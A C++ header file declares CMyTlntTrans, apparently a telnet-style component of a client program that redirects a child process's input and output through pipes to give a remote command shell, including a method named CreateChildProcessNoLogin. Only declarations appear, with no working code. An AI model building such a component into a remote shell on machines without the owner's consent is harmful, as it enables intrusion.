// MyTlntTrans.h: interface for the CMyTlntTrans class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MYTLNTTRANS_H__D438FABD_683A_40E8_91D5_FC993011810D__INCLUDED_)
#define AFX_MYTLNTTRANS_H__D438FABD_683A_40E8_91D5_FC993011810D__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

class CMyTlntTrans : public CMyClientTran
{
public:
	CMyTlntTrans();
	virtual ~CMyTlntTrans();

	void StartWork(PSDLLINFO m_DllInfo);
	UINT ReadLine(char* pReadBuf);

	void SendCmd();
	void static SendCmdThread(LPVOID lPvoid);

private:
	BOOL	CreateShellRedirect();
	BOOL	CreateChildProcessNoLogin();
	HANDLE	hChildStdinRd;
	HANDLE	hChildStdinWr;
	HANDLE	hChildStdinWrDup;
	HANDLE	hChildStdoutRd;
	HANDLE	hChildStdoutWr;
	HANDLE	hChildStdoutRdDup;
	HANDLE	hSaveStdin;
	HANDLE	hSaveStdout;
	HANDLE	hProcess;

	char	m_CmdFilePath[256];
	char*	pSendBuf;
};

#endif // !defined(AFX_MYTLNTTRANS_H__D438FABD_683A_40E8_91D5_FC993011810D__INCLUDED_)
